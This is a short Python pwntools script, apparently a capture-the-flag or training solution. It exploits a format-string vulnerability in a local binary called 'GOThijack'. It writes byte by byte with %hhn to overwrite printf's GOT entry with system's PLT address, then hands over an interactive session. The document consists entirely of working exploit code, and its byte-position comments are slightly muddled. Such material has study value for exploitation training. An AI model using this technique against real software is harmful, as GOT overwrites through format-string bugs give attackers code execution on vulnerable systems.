#!/usr/bin/env python
from pwn import *

r = process('./GOThijack')

#our goal is to overwrite the address in got
printf_got = 0x0804a010
#when next time call print it will change to call system
system_plt = 0x8048440

#Because we want to change got, so we need to put got onto the stack
payload = p32(printf_got)
#we deicide to overwrite it byte by byte, got+1 means \xa0
payload += p32(printf_got+1)
#+2 means \x04
payload += p32(printf_got+2)
#+3 means \x08
payload += p32(printf_got+3)

#0x40 - 16 = 48
payload += '%48c%7$hhn'
#0x84 - 0x40 = 68
payload += '%68c%8$hhn'
#0x04 - 0x84 + 256 = 128
payload += '%128c%9$hhn'
#0x08 - 0x4 = 4
payload += '%4c%10$hhn'

r.sendline(payload)
r.interactive()
